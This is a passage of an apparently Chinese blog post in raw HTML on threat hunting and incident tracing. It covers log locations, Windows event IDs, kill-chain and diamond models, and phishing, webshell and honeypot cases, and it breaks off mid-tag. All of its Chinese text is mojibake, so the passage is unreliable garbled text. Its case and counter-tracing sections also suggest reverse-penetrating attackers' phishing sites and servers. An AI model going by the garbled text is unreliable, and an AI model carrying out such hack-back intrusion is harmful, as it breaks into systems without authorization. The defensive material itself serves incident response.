Huntingâ€ï¼Œæ˜¯ä¸ºäº†åº”å¯¹å¤–éƒ¨APTæ”»å‡»è€…å’Œå†…éƒ¨åˆ©ç›Šé©±åŠ¨çš„å‘˜å·¥å¨èƒè€Œæå‡ºçš„ä¸€ç§è§£å†³æ–¹æ¡ˆã€‚å¨èƒç‹©çŒ[4]æŠ€æœ¯ä¸è¢«åŠ¨åœ°ç­‰å¾…ä¸å“åº”ï¼Œè€Œæ˜¯é€šè¿‡æŒç»­æ€§ç›‘æµ‹æŠ€æœ¯ï¼Œæ›´æ—©ã€æ›´å¿«åœ°æ£€æµ‹å’Œå‘ç°å¨èƒï¼Œå¹¶è¿½è¸ªå¨èƒçš„æºå¤´ã€‚å¨èƒç‹©çŒæŠ€æœ¯å¼ºè°ƒç”¨æ”»å‡»è€…çš„è§†è§’æ¥æ£€æµ‹æ”»å‡»ï¼Œå‡å°‘æ”»å‡»è€…é©»ç•™æ—¶é—´ï¼Œä»è€Œæ˜¾è‘—åœ°æ”¹å–„ç»„ç»‡çš„å®‰å…¨çŠ¶å†µã€‚æ”¾çœ¼ä¸–ç•Œï¼ŒåŒ…æ‹¬FireEyeç­‰ä¸ºä»£è¡¨çš„å‚å•†ä»¥åŠè¶Šæ¥è¶Šå¤šçš„å¤§å‹ç»„ç»‡ä¹Ÿå¼€å§‹è¿›è¡Œå¨èƒç‹©çŒã€‚</p><p>å·¥å…·</p><p>å®‰å…¨åˆ†æå¸ˆéœ€è¦æ£€æŸ¥ç³»ç»Ÿå’Œç½‘ç»œä¸Šå‘ç”Ÿçš„å†å²æ“ä½œè®°å½•å’Œå½“å‰çŠ¶æ€è¯¦ç»†ä¿¡æ¯ï¼Œå› æ­¤éœ€è¦ä¾é å¤šç§å·¥å…·å’Œæ•°æ®æºæ¥ååŠ©æº¯æºåˆ†æï¼Œå¸¸ç”¨çš„å·¥å…·åŒ…æ‹¬ï¼š</p><ol><li><p>å®‰å…¨ç›‘æ§å·¥å…·ï¼šå®‰å…¨åˆ†æå¸ˆä½¿ç”¨ä¸åŒæ¥æºçš„ç›‘æ§æ•°æ®ï¼Œä¾‹å¦‚é˜²ç«å¢™ã€ç»ˆç«¯é˜²æŠ¤ã€ç½‘ç»œå…¥ä¾µæ£€æµ‹ã€å†…éƒ¨å¨èƒæ£€æµ‹ä»¥åŠå…¶ä»–å®‰å…¨å·¥å…·çš„ç›‘æ§æ•°æ®ï¼Œç”¨ä»¥æç»˜é©»ç•™åœ¨ç½‘ç»œä¸­çš„æ”»å‡»è€…æ‰€è¿›è¡Œçš„æ´»åŠ¨ã€‚</p></li><li><p>å¯è§†åŒ–åˆ†æå·¥å…·ï¼šå¸®åŠ©å®‰å…¨åˆ†æå¸ˆé€šè¿‡ä½¿ç”¨äº¤äº’å¼ä»ªè¡¨æ¿æ¥å®ç°å¤æ‚å…³ç³»æ•°æ®å¯è§†åŒ–ï¼Œå‘ç°ä¸åŒæ•°æ®é›†ä¹‹é—´çš„éšè—å…³è”å…³ç³»ã€‚</p></li><li><p>SIEMè§£å†³æ–¹æ¡ˆï¼šSIEMè§£å†³æ–¹æ¡ˆä»ç½‘ç»œç¯å¢ƒä¸­çš„å„ç§æ¥æºæ”¶é›†ç»“æ„åŒ–æ—¥å¿—æ•°æ®ï¼Œæä¾›å¯¹æ•°æ®çš„å®æ—¶åˆ†æå¹¶å‘ç›¸å…³éƒ¨é—¨å‘å‡ºå®‰å…¨è­¦æŠ¥ã€‚SIEMè§£å†³æ–¹æ¡ˆå¯å¸®åŠ©å®‰å…¨åˆ†æå¸ˆè‡ªåŠ¨æ”¶é›†å¹¶åˆ©ç”¨æ¥è‡ªå®‰å…¨ç›‘è§†å·¥å…·å’Œå…¶ä»–æ¥æºçš„å¤§é‡æ—¥å¿—æ•°æ®ï¼Œä»è€Œè¯†åˆ«æ½œåœ¨å®‰å…¨å¨èƒã€‚</p></li><li><p>ç½‘ç»œå¨èƒæƒ…æŠ¥ï¼šå¨èƒæƒ…æŠ¥æé«˜äº†åˆ†æäººå‘˜è¯†åˆ«ç›¸å…³å¨èƒå¹¶åŠæ—¶åšå‡ºå“åº”çš„èƒ½åŠ›ï¼Œé€šè¿‡å¼€æºçš„å¨èƒæƒ…æŠ¥åº“å®ç°ä¿¡æ¯äº¤æ¢ï¼Œå¾—åˆ°å¨èƒåˆ†ææ‰€éœ€çš„æ¶æ„IPåœ°å€ã€æ¶æ„è½¯ä»¶å“ˆå¸Œå€¼ç­‰ä¿¡æ¯ã€‚</p></li><li><p>å…¶ä»–å·¥å…·ï¼šä¸€äº›ç‰¹å®šåŠŸèƒ½çš„åˆ†æå·¥å…·å¯¹æ”»å‡»æº¯æºä¹Ÿæœ‰å¾ˆå¥½çš„å¸®åŠ©ï¼Œä¾‹å¦‚æ£€æŸ¥PDFæ“ä½œã€PowerShellæ“ä½œç­‰ã€‚</p></li></ol><hr><p>ä¸Šé¢çš„è¯´çš„å¤ªå®˜æ–¹äº†ï¼Œè´´ä¸€ä¸ªæ¯”è¾ƒé€šä¿—æ˜“æ‡‚çš„ã€‚</p><p>è¢«æ”»å‡»åæº¯æºï¼š</p><blockquote><p>å‡ºç°å¼‚å¸¸çš„æ—¶é—´ç‚¹(éå¸¸é‡è¦)ã€å¼‚å¸¸æœåŠ¡å™¨çš„ä¸»è¦ä¸šåŠ¡æƒ…å†µã€å¤§è‡´çš„ä¸€ä¸ªç½‘ç»œæ‹“æ‰‘æ˜¯ä¸æ˜¯åœ¨DMZåŒºã€æ˜¯å¦å¯ä»¥å…¬ç½‘è®¿é—®ã€å¼€æ”¾äº†é‚£äº›ç«¯å£ã€æ˜¯å¦æœ‰æ‰“è¡¥ä¸ã€ä½¿ç”¨äº†æ€ä¹ˆæ ·çš„ä¸€ä¸ªwebæŠ€æœ¯ã€æœ€è¿‘æ˜¯å¦åšè¿‡ä»€ä¹ˆå˜æ›´ã€æœ‰æ²¡æœ‰ä»€ä¹ˆå®‰å…¨è®¾å¤‡ä¹‹ç±»çš„ã€‚</p></blockquote><p>æ ¹æ®æ”¶é›†åˆ°çš„ä¿¡æ¯ï¼Œå¾€å¾€å¯ä»¥å¾—å‡ºäº†å‡ ç§å¯èƒ½ã€‚ä¸€ä¸ªwebæœåŠ¡å™¨å…¬ç½‘å¯ä»¥è®¿é—®å‡ºç°äº†è¢«æŒ‚é»‘é“¾çš„äº‹ä»¶ä½¿ç”¨äº†s2æ¡†æ¶ï¼Œé‚£ä¹ˆåˆæ­¥å¯ä»¥æ€€ç–‘æ˜¯s2-045 s2-046ä¹‹ç±»çš„å‘½ä»¤æ‰§è¡Œæ¼æ´äº†ï¼›å¦‚æœä¸€å°å…¬ç½‘æœåŠ¡å™¨æ²¡æœ‰å®‰è£…è¡¥ä¸åˆæ²¡æœ‰é˜²ç«å¢™é˜²æŠ¤ï¼Œadministratorçš„å¯†ç ä¸ºP@sswrodé‚£ä¹ˆæœ‰å¾ˆå¤§çš„å¯èƒ½æ€§æ˜¯è¢«æš´åŠ›ç ´è§£æˆåŠŸï¼›åé¢çš„å·¥ä½œä¸»è¦å°±æ˜¯æ”¶é›†å„ç§èµ„æ–™è¯æ˜è¿™ä¸€çŒœæƒ³å³å¯ã€‚</p><h2 id="æ”»å‡»æºæ•è·"><a href="#æ”»å‡»æºæ•è·" class="headerlink" title="æ”»å‡»æºæ•è·"></a>æ”»å‡»æºæ•è·</h2><p>å®‰å…¨è®¾å¤‡æŠ¥è­¦ï¼Œå¦‚æ‰«æIPã€å¨èƒé˜»æ–­ã€ç—…æ¯’æœ¨é©¬ã€å…¥ä¾µäº‹ä»¶ç­‰<br> æ—¥å¿—ä¸æµé‡åˆ†æï¼Œå¼‚å¸¸çš„é€šè®¯æµé‡ã€æ”»å‡»æºä¸æ”»å‡»ç›®æ ‡ç­‰<br> æœåŠ¡å™¨èµ„æºå¼‚å¸¸ï¼Œå¼‚å¸¸çš„æ–‡ä»¶ã€è´¦å·ã€è¿›ç¨‹ã€ç«¯å£ï¼Œå¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡å’ŒæœåŠ¡ç­‰<br> é‚®ä»¶é’“é±¼ï¼Œè·å–æ¶æ„æ–‡ä»¶æ ·æœ¬ã€é’“é±¼ç½‘ç«™URLç­‰<br> èœœç½ç³»ç»Ÿï¼Œè·å–æ”»å‡»è€…è¡Œä¸ºã€æ„å›¾çš„ç›¸å…³ä¿¡</p><h3 id="åŸºäºæ—¥å¿—çš„æº¯æºï¼ˆWeb-ç³»ç»Ÿè¢«æ”»å‡»ï¼‰"><a href="#åŸºäºæ—¥å¿—çš„æº¯æºï¼ˆWeb-ç³»ç»Ÿè¢«æ”»å‡»ï¼‰" class="headerlink" title="åŸºäºæ—¥å¿—çš„æº¯æºï¼ˆWeb ç³»ç»Ÿè¢«æ”»å‡»ï¼‰"></a>åŸºäºæ—¥å¿—çš„æº¯æºï¼ˆWeb ç³»ç»Ÿè¢«æ”»å‡»ï¼‰</h3><p>ä½¿ç”¨è·¯ç”±å™¨ã€ä¸»æœºç­‰è®¾å¤‡è®°å½•ç½‘ç»œä¼ è¾“çš„æ•°æ®æµä¸­çš„å…³é”®ä¿¡æ¯(æ—¶é—´ã€æºåœ°å€ã€ç›®çš„åœ°å€)ï¼Œè¿½è¸ªæ—¶åŸºäºæ—¥å¿—æŸ¥è¯¢åšåå‘è¿½è¸ªã€‚</p><p>è¿™ç§æ–¹å¼çš„ä¼˜ç‚¹åœ¨äºå…¼å®¹æ€§å¼ºã€æ”¯æŒäº‹åè¿½æº¯ã€ç½‘ç»œå¼€é”€è¾ƒå°ã€‚ä½†æ˜¯åŒæ—¶è¯¥æ–¹æ³•ä¹Ÿå—æ€§èƒ½ã€ç©ºé—´å’Œéšç§ä¿æŠ¤ç­‰çš„é™åˆ¶ï¼Œè€ƒè™‘åˆ°ä»¥ä¸Šçš„å› ç´ ï¼Œå¯ä»¥é™åˆ¶è®°å½•çš„æ•°æ®ç‰¹å¾å’Œæ•°æ®æ•°é‡ã€‚å¦å¤–å¯ä»¥ä½¿ç”¨æµé‡é•œåƒç­‰æŠ€æœ¯æ¥å‡å°å¯¹ç½‘ç»œæ€§èƒ½çš„å½±å“ã€‚</p><p>å¸¸è§å‡ ä¸ªä¸­é—´ä»¶çš„æ—¥å¿—å¦‚ä¸‹ï¼š</p><blockquote><p>1.apacheçš„æ—¥å¿—è·¯å¾„ä¸€èˆ¬é…ç½®åœ¨httpd.confçš„ç›®å½•ä¸‹æˆ–è€…ä½äº/var/log/http</p><p>2.IISçš„æ—¥å¿—é»˜è®¤åœ¨ç³»ç»Ÿç›®å½•ä¸‹çš„Logfilesä¸‹çš„ç›®å½•å½“ä¸­</p><p>3.tomcat ä¸€èˆ¬ä½äºtomcatå®‰è£…ç›®å½•ä¸‹çš„ä¸€ä¸ªlogsæ–‡ä»¶å¤¹ä¸‹é¢</p><p>4.Nginxæ—¥å¿—ä¸€èˆ¬é…ç½®åœ¨nginx.confæˆ–è€…vhostçš„confæ–‡ä»¶ä¸­</p><p>æ—¥å¿—ä¸€èˆ¬ä»¥æ—¥æœŸå‘½åï¼Œæ–¹ä¾¿åç»­å®¡è®¡ä¸å®‰å…¨äººå‘˜è¿›è¡Œåˆ†æã€‚</p></blockquote><h3 id="ä¸»æœºç³»ç»Ÿã€æ•°æ®åº“ç³»ç»Ÿ"><a href="#ä¸»æœºç³»ç»Ÿã€æ•°æ®åº“ç³»ç»Ÿ" class="headerlink" title="ä¸»æœºç³»ç»Ÿã€æ•°æ®åº“ç³»ç»Ÿ"></a>ä¸»æœºç³»ç»Ÿã€æ•°æ®åº“ç³»ç»Ÿ</h3><p>Linux:</p><p>/var/log/auth.log åŒ…å«ç³»ç»Ÿæˆæƒä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·ç™»å½•å’Œä½¿ç”¨çš„æƒé™æœºåˆ¶ç­‰ä¿¡æ¯</p><p>/var/log/lastlog è®°å½•ç™»å½•çš„ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤lastlogæŸ¥çœ‹</p><p>/var/log/secure è®°å½•å¤§å¤šæ•°åº”ç”¨è¾“å…¥çš„è´¦å·ä¸å¯†ç ï¼Œç™»å½•æˆåŠŸä¸å¦</p><p>/var/log/cron è®°å½•crontabå‘½ä»¤æ˜¯å¦è¢«æ­£ç¡®çš„æ‰§è¡Œ</p><p>Windowsï¼š</p><p>Windowså¹³å°ä¸‹é¢çš„æº¯æºå°±ç›¸å¯¹å®¹æ˜“ä¸€äº›å½“ç„¶ä¸»è¦è¿˜æ˜¯ä¾é windowsçš„æ—¥å¿—ä¸€èˆ¬ç”¨ eventvwrå‘½ä»¤æ‰“å¼€äº‹ä»¶æŸ¥çœ‹å™¨ã€‚é»˜è®¤åˆ†ä¸ºä¸‰ç±»ï¼šlåº”ç”¨ç¨‹åºã€å®‰å…¨ã€æ€§ç»Ÿ ä»¥evtæ–‡ä»¶å½¢å¼å­˜å‚¨%systemroot%\system32\configç›®å½•ï¼š</p><p><img src="https://image.3001.net/images/20190426/1556290560_5cc31c00740d8.png!small"></p><p>åˆç†ä½¿ç”¨ç­›é€‰å™¨å¾€å¾€å¯ä»¥å¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„æ’æŸ¥æ—¥å¿—ï¼Œæ¯”å¦‚æ€€ç–‘æ˜¯æš´åŠ›ç ´è§£å…¥ä¾µçš„ç­›é€‰<strong>äº‹ä»¶ID == 4625å®¡æ ¸å¤±è´¥çš„æ—¥å¿—ï¼Œåç»­é€šè¿‡å¯¹æ—¶é—´çš„æ’æŸ¥ã€ä»¥åŠæºIPåœ°å€ã€ç±»å‹ä¸è¯·æ±‚çš„é¢‘ç‡è¿›è¡Œåˆ†ææ¥åˆ¤æ–­æ˜¯å¦æ˜¯æ¥æºäºå†…ç½‘çš„æš´åŠ›ç ´è§£ã€‚</strong></p><p><img src="https://image.3001.net/images/20190426/1556290578_5cc31c126b0eb.png!small"></p><p>é€šè¿‡ç³»ç»Ÿå†…éƒ¨çš„æ—¥å¿—æ¥åˆ¤æ–­æ˜¯å¦æ˜¯æ¶æ„è¿›ç¨‹çš„è¿è¡ŒçŠ¶æ€ã€‚</p><p><img src="https://image.3001.net/images/20190426/1556290597_5cc31c251d176.png!small"></p><p>å¦‚ä¸‹å›¾æ˜¯ä¸€ä¸ªå…¸å‹çš„SMBè®¤è¯å¤±è´¥çš„æƒ…å†µï¼š</p><p><img src="https://image.3001.net/images/20190426/1556290673_5cc31c715e3fb.png!small"></p><p>ç„¶åå°±æ˜¯Windows è¡¥ä¸äº†ã€‚</p><h3 id="è·¯ç”±è¾“å…¥è°ƒè¯•æŠ€æœ¯"><a href="#è·¯ç”±è¾“å…¥è°ƒè¯•æŠ€æœ¯" class="headerlink" title="è·¯ç”±è¾“å…¥è°ƒè¯•æŠ€æœ¯"></a>è·¯ç”±è¾“å…¥è°ƒè¯•æŠ€æœ¯</h3><p>åœ¨æ”»å‡»æŒç»­å‘é€æ•°æ®ï¼Œä¸”ç‰¹æ€§è¾ƒä¸ºç¨³å®šçš„åœºæ™¯ä¸‹ï¼Œå¯ä»¥ä½¿ç”¨è·¯ç”±å™¨çš„è¾“å…¥è°ƒè¯•æŠ€æœ¯ï¼Œåœ¨åŒ¹é…åˆ°æ”»å‡»æµé‡æ—¶åŠ¨æ€çš„å‘ä¸Šè¿½è¸ªã€‚è¿™ç§æ–¹å¼åœ¨DDoSæ”»å‡»è¿½æº¯ä¸­æ¯”è¾ƒæœ‰æ•ˆï¼Œä¸”ç½‘ç»œå¼€é”€è¾ƒå°ã€‚</p><h2 id="åˆ†ææ¨¡å‹â€”â€”æ€ä¼¤é“¾æ¨¡å‹-amp-é’»çŸ³æ¨¡å‹"><a href="#åˆ†ææ¨¡å‹â€”â€”æ€ä¼¤é“¾æ¨¡å‹-amp-é’»çŸ³æ¨¡å‹" class="headerlink" title="åˆ†ææ¨¡å‹â€”â€”æ€ä¼¤é“¾æ¨¡å‹&amp;é’»çŸ³æ¨¡å‹"></a>åˆ†ææ¨¡å‹â€”â€”æ€ä¼¤é“¾æ¨¡å‹&amp;é’»çŸ³æ¨¡å‹</h2><p>æ€ä¼¤é“¾è¿™ä¸ªæ¦‚å¿µæºè‡ªå†›äº‹é¢†åŸŸï¼Œå®ƒæ˜¯ä¸€ä¸ªæè¿°æ”»å‡»ç¯èŠ‚çš„æ¨¡å‹ã€‚ä¸€èˆ¬æ€ä¼¤é“¾æœ‰è®¤ä¸ºä¾¦æŸ¥è·Ÿè¸ª(Reconnaissance)ã€æ­¦å™¨æ„å»º(Weaponization)ã€è½½è·æŠ•é€’(Delivery)ã€æ¼æ´åˆ©ç”¨(Exploitation)ã€å®‰è£…æ¤å…¥(Installation)ã€é€šä¿¡æ§åˆ¶(Command&amp;Control)ã€è¾¾æˆç›®æ ‡(Actions on Objective)ç­‰å‡ ä¸ªé˜¶æ®µã€‚</p><p>é’»çŸ³æ¨¡å‹ç”±ç½‘ç»œæƒ…æŠ¥åˆ†æä¸å¨èƒç ”ç©¶ä¸­å¿ƒ(The Center for Cyber Intelligence Anaysis and Threat Researchï¼ŒCCIATR)æœºæ„çš„Sergio Catagironeç­‰äººåœ¨2013å¹´æå‡ºã€‚</p><p>è¯¥æ¨¡å‹æŠŠæ‰€æœ‰çš„å®‰å…¨äº‹ä»¶(Event)åˆ†ä¸ºå››ä¸ªæ ¸å¿ƒå…ƒç´ ï¼Œå³æ•Œæ‰‹(Adversary)ï¼Œèƒ½åŠ›(Capability)ï¼ŒåŸºç¡€è®¾æ–½(Infrastructure)å’Œå—å®³è€…(Victim)ï¼Œä»¥è±å½¢è¿çº¿ä»£è¡¨å®ƒä»¬ä¹‹é—´çš„å…³ç³»ï¼Œå› è€Œå‘½åä¸ºâ€œé’»çŸ³æ¨¡å‹â€ã€‚</p><p>æ€ä¼¤é“¾æ¨¡å‹çš„ç‰¹ç‚¹æ˜¯å¯è¯´æ˜æ”»å‡»çº¿è·¯å’Œæ”»å‡»çš„è¿›ç¨‹ï¼Œè€Œé’»çŸ³æ¨¡å‹çš„ç‰¹ç‚¹æ˜¯å¯è¯´æ˜æ”»å‡»è€…åœ¨å•ä¸ªäº‹ä»¶ä¸­çš„æ”»å‡»ç›®çš„å’Œæ‰€ä½¿ç”¨æ”»å‡»æ‰‹æ³•ã€‚</p><h2 id="å…³è”åˆ†ææ–¹æ³•"><a href="#å…³è”åˆ†ææ–¹æ³•" class="headerlink" title="å…³è”åˆ†ææ–¹æ³•"></a>å…³è”åˆ†ææ–¹æ³•</h2><p>å…³è”åˆ†æç”¨äºæŠŠå¤šä¸ªä¸åŒçš„æ”»å‡»æ ·æœ¬ç»“åˆèµ·æ¥ã€‚</p><p>æ–‡æ¡£ç±»ï¼ˆæ¯”å¦‚é’“é±¼ï¼Œé™„ä»¶ç­‰ã€‚</p><ul><li>hash</li><li>ssdeep</li><li>ç‰ˆæœ¬ä¿¡æ¯(å…¬å¸/ä½œè€…/æœ€åä¿®æ”¹ä½œè€…/åˆ›å»ºæ—¶é—´/æœ€åä¿®æ”¹æ—¶é—´)</li></ul><p>è¡Œä¸ºåˆ†æ</p><p>åŸºäºç½‘ç»œè¡Œä¸ºï¼Œç±»ä¼¼çš„äº¤äº’æ–¹å¼</p><p>å¯æ‰§è¡Œæ–‡ä»¶ç›¸ä¼¼æ€§åˆ†æ</p><ul><li>ç‰¹æ®Šç«¯å£</li><li>ç‰¹æ®Šå­—ç¬¦ä¸²/å¯†é’¥</li><li>PDBæ–‡ä»¶è·¯å¾„<ul><li>ç›¸ä¼¼çš„æ–‡ä»¶å¤¹</li></ul></li><li>ä»£ç å¤ç”¨<ul><li>ç›¸ä¼¼çš„ä»£ç ç‰‡æ®µ</li></ul></li></ul><h2 id="æ¡ˆä¾‹"><a href="#æ¡ˆä¾‹" class="headerlink" title="æ¡ˆä¾‹"></a>æ¡ˆä¾‹</h2><h3 id="bypass-å¸ˆå‚…åšå®¢"><a href="#bypass-å¸ˆå‚…åšå®¢" class="headerlink" title="bypass å¸ˆå‚…åšå®¢"></a>bypass å¸ˆå‚…åšå®¢</h3><p>æ¡ˆä¾‹ä¸€ï¼šé‚®ä»¶é’“é±¼æ”»å‡»æº¯æº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ”»é˜²åœºæ™¯ï¼šæ”»å‡»è€…åˆ©ç”¨ç¤¾ä¼šå·¥ç¨‹å­¦æŠ€å·§ä¼ªé€ æ­£å¸¸é‚®ä»¶å†…å®¹ï¼Œç»•è¿‡é‚®ä»¶ç½‘å…³çš„æŸ¥æ€ï¼ŒæˆåŠŸæŠ•é€’åˆ°ç›®æ ‡é‚®ç®±ï¼Œè¯±éª—ç”¨æˆ·ç‚¹å‡»é‚®ä»¶é“¾æ¥æˆ–ä¸‹è½½é™„ä»¶æ–‡ä»¶ã€‚</span><br><span class="line">ä¿¡æ¯æ”¶é›†ï¼š é€šè¿‡æŸ¥çœ‹é‚®ä»¶åŸæ–‡ï¼Œè·å–å‘é€æ–¹IPåœ°å€ã€åŸŸååç¼€é‚®ç®±ã€é’“é±¼ç½‘ç«™æˆ–æ¶æ„é™„ä»¶æ ·æœ¬ç­‰ä¿¡æ¯ã€‚</span><br><span class="line">æº¯æºæ–¹å¼ï¼šç¬¬ä¸€ç§ï¼Œå¯ä»¥é€šè¿‡ç›¸å…³è”çš„åŸŸå&#x2F;IPè¿›è¡Œè¿½è¸ªï¼›ç¬¬äºŒç§ï¼Œå¯¹é’“é±¼ç½‘ç«™è¿›è¡Œåå‘æ¸—é€è·å–æƒé™ï¼Œè¿›ä¸€æ­¥æ”¶é›†æ”»å‡»è€…ä¿¡æ¯ï¼›ç¬¬ä¸‰ç§ï¼Œé€šè¿‡å¯¹é‚®ä»¶æ¶æ„é™„ä»¶è¿›è¡Œåˆ†æï¼Œåˆ©ç”¨å¨èƒæƒ…æŠ¥æ•°æ®å¹³å°å¯»æ‰¾åŒæºæ ·æœ¬è·å–ä¿¡æ¯ï¼Œä¹Ÿèƒ½è¿›ä¸€æ­¥å¯¹æ”»å‡»è€…çš„ç”»åƒè¿›è¡Œå‹¾å‹’ã€‚</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹äºŒï¼šWebå…¥ä¾µæº¯æº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ”»é˜²åœºæ™¯ï¼šæ”»å‡»è€…é€šè¿‡NDAYå’Œ0DAYæ¼æ´æ¸—å…¥æœåŠ¡å™¨ç½‘æ®µï¼ŒWebshell è§¦å‘å®‰å…¨é¢„è­¦æˆ–è€…å¨èƒæ£€æµ‹é˜»æ–­äº†C&amp;CåŸŸåçš„é€šè®¯ã€‚</span><br><span class="line">æº¯æºæ–¹å¼ï¼šéš”ç¦»webshellæ ·æœ¬ï¼Œä½¿ç”¨Webæ—¥å¿—è¿˜åŸæ”»å‡»è·¯å¾„ï¼Œæ‰¾åˆ°å®‰å…¨æ¼æ´ä½ç½®è¿›è¡Œæ¼æ´ä¿®å¤ï¼Œä»æ—¥å¿—å¯ä»¥æ‰¾åˆ°æ”»å‡»è€…çš„IPåœ°å€ï¼Œä½†æ”»å‡»è€…ä¸€èˆ¬éƒ½ä¼šä½¿ç”¨ä»£ç†æœåŠ¡å™¨æˆ–åŒ¿åç½‘ç»œï¼ˆä¾‹å¦‚Torï¼‰æ¥æ©ç›–å…¶çœŸå®çš„IPåœ°å€ã€‚</span><br><span class="line">åœ¨å…¥ä¾µè¿‡ç¨‹ä¸­ï¼Œä½¿ç”¨åå¼¹shellã€è¿œç¨‹ä¸‹è½½æ¶æ„æ–‡ä»¶ã€ç«¯å£è¿œç¨‹è½¬å‘ç­‰æ–¹å¼ï¼Œä¹Ÿå®¹æ˜“è§¦å‘å¨èƒé˜»æ–­ï¼Œè€Œè¿™ä¸ªåŸŸå&#x2F;IPï¼Œæä¾›ä¸€ä¸ªåå‘ä¿¡æ¯æ”¶é›†å’Œæ¸—é€æµ‹è¯•çš„è·¯å¾„ã€‚</span><br></pre></td></tr></table></figure><p>æ¡ˆä¾‹ä¸‰ï¼šèœœç½æº¯æº</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ”»é˜²åœºæ™¯ï¼šåœ¨ä¼ä¸šå†…ç½‘éƒ¨ç½²èœœç½å»æ¨¡æ‹Ÿå„ç§å¸¸è§çš„åº”ç”¨æœåŠ¡ï¼Œè¯±å¯¼æ”»å‡»è€…æ”»å‡»ã€‚</span><br><span class="line">æº¯æºæ–¹å¼ï¼šåœ¨æ”»å‡»è€…å…¥ä¾µèœœç½æ—¶ï¼Œèœœç½å¯ä»¥è®°å½•æ”»å‡»è€…çš„å…¥ä¾µè¡Œä¸ºï¼Œè·å–æ”»å‡»è€…çš„ä¸»æœºä¿¡æ¯ã€æµè§ˆå™¨ä¿¡æ¯ã€ç”šè‡³æ˜¯çœŸå® IPåŠç¤¾äº¤ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><h3 id="é˜¿é‡Œäº‘å®‰å…¨ä¸­å¿ƒçš„æ¡ˆä¾‹"><a href="#é˜¿é‡Œäº‘å®‰å…¨ä¸­å¿ƒçš„æ¡ˆä¾‹" class="headerlink" title="é˜¿é‡Œäº‘å®‰å…¨ä¸­å¿ƒçš„æ¡ˆä¾‹"></a>é˜¿é‡Œäº‘å®‰å…¨ä¸­å¿ƒçš„æ¡ˆä¾‹</h3><p>ï¼ˆå…¶å®æ˜¯ä¸€ä¸ªäº§å“ï¼Œä¸è¿‡è¿™ä¸ªå›¾ç‰‡æ€è·¯å€¼å¾—å­¦ä¹ ï¼‰</p><ul><li>è •è™«ä¼ æ’­äº‹ä»¶</li></ul><p>ä¸‹å›¾æè¿°äº†è •è™«ä¼ æ’­æºï¼ˆä¾‹å¦‚ï¼š<code>185.234.*.*</code>ï¼‰é€šè¿‡SSHæš´åŠ›ç ´è§£æˆåŠŸç™»å½•åˆ°æœåŠ¡å™¨ï¼Œå¹¶é€šè¿‡bashæ‰§è¡Œ<strong>curl</strong>æŒ‡ä»¤ä»è¿œç«¯ä¸‹è½½æŒ–çŸ¿ç¨‹åºå¹¶åœ¨æœåŠ¡å™¨ä¸­æ‰§è¡Œè¯¥æŒ–çŸ¿ç¨‹åºã€‚</p><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/0713029951/p45771.png"></p><ul><li>Webæ¼æ´å…¥ä¾µäº‹ä»¶</li></ul><p>ä¸‹å›¾æè¿°äº†é»‘å®¢é€šè¿‡æœåŠ¡å™¨ï¼ˆä¾‹å¦‚ï¼š<code>202.144.*.*</code>ï¼‰å‘èµ·æ”»å‡»ï¼Œé€šè¿‡Webæ¼æ´å‘LinuxæœåŠ¡å™¨æ¤å…¥æ¶æ„shellè„šæœ¬å’ŒæŒ–çŸ¿ç¨‹åºï¼ŒåŒæ—¶å°†ä»£ç å†™å…¥è®¡åˆ’ä»»åŠ¡ï¼ˆ<strong>crond</strong>ï¼‰å®ç°æ”»å‡»æŒä¹…åŒ–ã€‚æ‚¨å¯ä»¥é€šè¿‡æº¯æºé¡µé¢çš„èŠ‚ç‚¹ä¿¡æ¯ï¼Œæ¸…æ™°åœ°äº†è§£è¿™ä¸€è¿‡ç¨‹ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä»¥è§‚å¯Ÿåˆ°æ”»å‡»è€…çš„å¤šä¸ªIPåŠæ¶æ„ä¸‹è½½æºURLä¿¡æ¯ã€‚</p><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/0713029951/p45773.png"></p><h3 id="ç”±WebShell-æº¯æºæ”»å‡»è€…çš„å…¥ä¾µé€”å¾„"><a href="#ç”±WebShell-æº¯æºæ”»å‡»è€…çš„å…¥ä¾µé€”å¾„" class="headerlink" title="ç”±WebShell æº¯æºæ”»å‡»è€…çš„å…¥ä¾µé€”å¾„"></a>ç”±WebShell æº¯æºæ”»å‡»è€…çš„å…¥ä¾µé€”å¾„</h3><p><a href="https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/">https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/</a></p><h1 id="åæº¯æºï¼ˆæº¯æºååˆ¶ï¼‰"><a href="#åæº¯æºï¼ˆæº¯æºååˆ¶ï¼‰" class="headerlink" title="åæº¯æºï¼ˆæº¯æºååˆ¶ï¼‰"></a>åæº¯æºï¼ˆæº¯æºååˆ¶ï¼‰</h1><h2 id="ip-å®šä½æŠ€æœ¯"><a href="#ip-å®šä½æŠ€æœ¯" class="headerlink" title="ip å®šä½æŠ€æœ¯"></a>ip å®šä½æŠ€æœ¯</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ ¹æ®IPå®šä½ç‰©ç†åœ°å€â€”ä»£ç†IP</span><br><span class="line"> æº¯æºæ¡ˆä¾‹ï¼šé€šè¿‡IPç«¯å£æ‰«æï¼Œåå‘æ¸—é€æœåŠ¡å™¨è¿›è¡Œåˆ†æï¼Œæœ€ç»ˆå®šä½åˆ°æ”»å‡»è€…ç›¸å…³ä¿¡æ¯</span><br></pre></td></tr></table></figure><h2 id="id-è¿½è¸ª"><a href="#id-è¿½è¸ª" class="headerlink" title="id è¿½è¸ª"></a>id è¿½è¸ª</h2><figure class="highlight 